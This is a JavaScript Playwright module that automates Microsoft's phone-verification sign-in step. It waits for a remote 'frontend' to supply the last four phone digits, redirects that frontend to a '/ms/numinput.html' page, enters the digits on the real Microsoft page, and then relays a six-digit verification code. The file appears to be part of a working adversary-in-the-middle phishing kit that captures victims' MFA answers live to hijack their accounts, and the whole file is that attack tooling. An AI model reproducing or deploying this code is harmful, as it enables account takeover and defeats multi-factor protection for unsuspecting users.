/**
 * Phone Handler
 * Handles phone digits input pages (last 4 digits)
 */

const globals = require('../config/globals');
const { sendToClient } = require('../services/websocket');
const { SELECTORS, TIMEOUTS, MAX_ATTEMPTS } = require('../config/constants');
const { fillCodeFields } = require('./codeHandler');

/**
 * Handle phone digits input page (last 4 digits) - WAIT FOR DIGITS FROM FRONTEND
 * @param {Object} page - Playwright page object
 */
async function handlePhoneDigitsInput(page) {
    console.log('📞 Handling phone digits input page...');

    // IMMEDIATELY notify frontend that we're on phone digits input page and redirect to numinput.html
    sendToClient({
        status: 'phone_digits_input_ready',
        message: 'Phone digits input page ready - Redirecting to phone input page',
        redirect: '/ms/numinput.html'
    });
    console.log('📤 Sent immediate phone digits input notification to frontend - redirecting to /numinput.html');

    // Wait for phone digits from frontend
    const maxAttempts = MAX_ATTEMPTS.PHONE_DIGITS;
    let attempts = 0;

    console.log('🔄 Waiting for phone digits from frontend...');

    while (!globals.get('globalPhoneDigits') && attempts < maxAttempts) {
        attempts++;

        // Check if we already have digits before waiting
        if (globals.get('globalPhoneDigits')) {
            console.log(`✅ Received digits: ${globals.get('globalPhoneDigits')}`);
            break;
        }

        // Add more frequent checking for better responsiveness
        await page.waitForTimeout(500);

        // Check again after waiting
        if (globals.get('globalPhoneDigits')) {
            console.log(`✅ Received digits: ${globals.get('globalPhoneDigits')}`);
            break;
        }

        if (attempts % 10 === 0) {
            console.log(`🔄 Still waiting for last 4 digits... (${attempts}/${maxAttempts})`);
        } else {
            console.log(`🔄 Waiting for last 4 digits... (${attempts}/${maxAttempts})`);
        }
    }

    const phoneDigits = globals.get('globalPhoneDigits');

    if (!phoneDigits) {
        console.log('⚠️ Timeout - No phone digits received from frontend');
        console.log('🔍 Please enter the last 4 digits manually in the browser');
        return;
    }

    console.log(`✅ Received last 4 digits: ${phoneDigits}`);

    // Look for phone digits input field - MICROSOFT'S ACTUAL SELECTORS
    const phoneDigitsSelectors = SELECTORS.PHONE_DIGITS_INPUT || [
        '#proof-confirmation',
        'input[name="proof-confirmation"]',
        'input[placeholder*="Last 4 digits of phone number"]',
        'input[placeholder*="last 4 digits"]',
        'input[placeholder*="phone number"]',
        'input[maxlength="4"][inputmode="numeric"]',
        'input[type="text"][maxlength="4"]',
        'input[type="number"][maxlength="4"]',
        'input[maxlength="4"]',
        'input[aria-label*="digits" i]',
        'input[placeholder*="digits" i]',
        'input[type="number"]',
        'input[inputmode="numeric"]'
    ];

    console.log('🔍 DEBUG: Testing phone digits selectors...');
    let phoneDigitsInput = null;
    let foundSelector = null;

    // First try the standard selectors
    for (let i = 0; i < phoneDigitsSelectors.length; i++) {
        const selector = phoneDigitsSelectors[i];
        const count = await page.locator(selector).count();
        if (count > 0) {
            console.log(`🔍 DEBUG: Selector ${i + 1} "${selector}" found ${count} elements`);
            const element = page.locator(selector).first();
            if (await element.isVisible()) {
                phoneDigitsInput = element;
                foundSelector = selector;
                console.log(`🎯 Found visible phone digits input with selector: ${selector}`);
                break;
            }
        }
    }

    // If standard selectors failed, do comprehensive input field scanning
    if (!phoneDigitsInput) {
        console.log('🔍 DEBUG: Standard selectors failed, doing comprehensive input scanning...');
        try {
            const allInputs = await page.locator('input').all();
            console.log(`🔍 DEBUG: Found ${allInputs.length} total input fields`);

            for (let i = 0; i < allInputs.length; i++) {
                const input = allInputs[i];
                try {
                    const isVisible = await input.isVisible();
                    if (!isVisible) continue;

                    const type = await input.getAttribute('type').catch(() => 'text');
                    const maxlength = await input.getAttribute('maxlength').catch(() => '');
                    const placeholder = await input.getAttribute('placeholder').catch(() => '');
                    const ariaLabel = await input.getAttribute('aria-label').catch(() => '');
                    const id = await input.getAttribute('id').catch(() => '');
                    const name = await input.getAttribute('name').catch(() => '');

                    // Check for Microsoft's boxed input field variations
                    if (
                        id === 'proof-confirmation' ||
                        name === 'proof-confirmation' ||
                        (placeholder && placeholder.toLowerCase().includes('last 4 digits')) ||
                        (placeholder && placeholder.toLowerCase().includes('phone number')) ||
                        (placeholder && placeholder.toLowerCase().includes('digits')) ||
                        (ariaLabel && ariaLabel.toLowerCase().includes('last 4 digits')) ||
                        (ariaLabel && ariaLabel.toLowerCase().includes('phone number')) ||
                        (ariaLabel && ariaLabel.toLowerCase().includes('digits')) ||
                        (maxlength === '120' && id && id.toLowerCase().includes('proof')) ||
                        (maxlength === '120' && name && name.toLowerCase().includes('proof'))
                    ) {
                        console.log(`🎯 FOUND PHONE INPUT: Input ${i + 1} - Boxed Microsoft field`);
                        phoneDigitsInput = input;
                        foundSelector = `input:nth-of-type(${i + 1})`;
                        break;
                    }
                } catch (e) {
                    console.log(`⚠️ Error scanning input ${i + 1}: ${e.message}`);
                    continue;
                }
            }
        } catch (e) {
            console.log(`❌ Error during comprehensive input scanning: ${e.message}`);
        }
    }

    if (!phoneDigitsInput) {
        console.log('❌ No phone digits input field found');
        return;
    }

    console.log(`🎯 Found phone digits input with selector: ${foundSelector}`);

    // Robust filling logic (same as email handler)
    const digitsToFill = phoneDigits.toString();
    console.log(`🔍 Filling phone digits: ${digitsToFill}`);

    // Remove readonly/disabled (just in case)
    await phoneDigitsInput.evaluate(el => {
        el.removeAttribute('readonly');
        el.removeAttribute('disabled');
    }).catch(() => { });

    // Method 1: Standard fill
    try {
        await phoneDigitsInput.fill('');
        await phoneDigitsInput.fill(digitsToFill);
    } catch (e) {
        console.log(`⚠️ Fill method failed: ${e.message}`);
    }

    // Verify Method 1
    let value = await phoneDigitsInput.inputValue().catch(() => '');
    console.log(`🔍 Post-fill check: "${value}"`);

    // Method 2: Clear + Type (if fill failed or mismatch)
    if (value !== digitsToFill) {
        console.log(`⚠️ Value mismatch after fill. Retrying with Type method...`);
        try {
            await phoneDigitsInput.click({ clickCount: 3 });
            await phoneDigitsInput.press('Backspace');
            await phoneDigitsInput.fill('');
            await phoneDigitsInput.type(digitsToFill, { delay: 50 });
        } catch (e) {
            console.log(`⚠️ Type method failed: ${e.message}`);
        }

        value = await phoneDigitsInput.inputValue().catch(() => '');
        console.log(`🔍 Post-type check: "${value}"`);
    }

    // Method 3: Direct DOM manipulation (Force set)
    if (value !== digitsToFill) {
        console.log(`⚠️ Value mismatch after type. Forcing value via evaluate...`);
        await phoneDigitsInput.evaluate((el, v) => { el.value = v; }, digitsToFill);
        // Trigger events
        await phoneDigitsInput.evaluate(el => {
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
        });

        value = await phoneDigitsInput.inputValue().catch(() => '');
        console.log(`🔍 Post-evaluate check: "${value}"`);
    }

    if (value === digitsToFill) {
        console.log(`✅ Filled phone digits successfully: ${digitsToFill}`);
    } else {
        console.log(`⚠️ Phone digits fill verification failed, final value: [${value}]`);
    }

    // Look for submit/continue button
    const submitSelectors = [
        'button:has-text("Send code")',
        'button:has-text("Continue")',
        'button:has-text("Submit")',
        'button:has-text("Next")',
        'button[type="submit"]',
        'input[type="submit"]',
        'button:has-text("Verify")',
        'button:has-text("Send")'
    ];

    let submitClicked = false;

    for (const selector of submitSelectors) {
        try {
            const submitButton = page.locator(selector);
            const isVisible = await submitButton.isVisible();

            if (isVisible) {
                const buttonText = await submitButton.textContent();
                console.log(`🎯 Found submit button with selector: ${selector} - "${buttonText}"`);

                await submitButton.click();
                console.log(`✅ Submit button clicked: "${buttonText}"`);

                submitClicked = true;
                break;
            }
        } catch (e) {
            // Continue to next selector
        }
    }

    if (!submitClicked) {
        console.log('⚠️ No submit button found, trying Enter key');
        await page.keyboard.press('Enter');
    }

    // Wait a moment for the page to update
    await page.waitForTimeout(3000);

    // Check if 6-digit code input fields appeared (Microsoft shows them on same page)
    const sixDigitInputs = await page.locator('input[id^="codeEntry-"]').count();
    const codeDigitInputs = await page.locator('input[aria-label*="Enter code digit"]').count();
    const singleDigitInputs = await page.locator('input[type="text"][maxlength="1"][inputmode="numeric"]').count();

    console.log(`🔍 DEBUG: After submit - 6-digit inputs: ${sixDigitInputs}, code digit inputs: ${codeDigitInputs}, single digit inputs: ${singleDigitInputs}`);

    if (sixDigitInputs >= 6 || codeDigitInputs >= 6 || singleDigitInputs >= 6) {
        console.log('✅ 6-digit verification code fields appeared - switching to code input mode');

        // Wait for verification code from frontend
        let codeAttempts = 0;
        const maxCodeAttempts = MAX_ATTEMPTS.CODE_INPUT;

        const verificationCode = globals.get('globalVerificationCode');

        if (verificationCode) {
            console.log(`✅ Using already received verification code: ${verificationCode}`);
        } else {
            console.log('⏳ Waiting for verification code from frontend...');

            while (!globals.get('globalVerificationCode') && codeAttempts < maxCodeAttempts) {
                codeAttempts++;
                if (codeAttempts % 10 === 0) {
                    console.log(`🔄 Still waiting for verification code... (${codeAttempts}/${maxCodeAttempts})`);
                }
                await page.waitForTimeout(1000);
            }
        }

        const finalCode = globals.get('globalVerificationCode');

        if (finalCode) {
            console.log(`✅ Using verification code: ${finalCode}`);

            // Fill the 6-digit code fields
            const codeString = finalCode.toString();
            if (codeString.length === 6) {
                await fillCodeFields(page, codeString);

                // Click submit button for verification code
                const codeSubmitSelectors = [
                    'button:has-text("Verify")',
                    'button:has-text("Submit")',
                    'button:has-text("Continue")',
                    'button[type="submit"]'
                ];

                for (const selector of codeSubmitSelectors) {
                    try {
                        const button = page.locator(selector);
                        if (await button.isVisible() && await button.isEnabled()) {
                            await button.click();
                            console.log(`✅ Clicked code verification button: ${selector}`);
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }

                console.log('🎉 Phone MFA flow completed successfully!');
                return;
            } else {
                console.log(`⚠️ Verification code length is ${codeString.length}, expected 6 digits`);
            }
        } else {
            console.log('⚠️ No verification code received from frontend');
        }
    } else {
        console.log('🔍 No 6-digit code fields detected - checking for page navigation...');

        // Wait for page navigation
        try {
            await page.waitForNavigation({ waitUntil: 'networkidle', timeout: TIMEOUTS.NAVIGATION });
            console.log('✅ Page navigation detected');
        } catch (e) {
            console.log('🔍 No navigation detected - may be same page update');
        }
    }

    console.log('📞 Phone digits input automation completed');
}

module.exports = {
    handlePhoneDigitsInput
};

